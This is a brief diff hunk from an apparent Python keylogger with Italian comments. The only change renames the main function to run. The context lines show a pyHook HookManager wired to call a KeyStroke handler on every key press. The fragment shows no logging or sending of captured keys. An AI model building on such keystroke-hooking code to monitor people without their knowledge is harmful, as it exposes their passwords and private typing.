@@ -95,7 +95,7 @@ def KeyStroke(event):
     return True
 
 
-def main():
+def run():
     # crea e registra un hookmanager 
     kl         = pyHook.HookManager()
     # all'evento KeyDown chiama KeyStroke
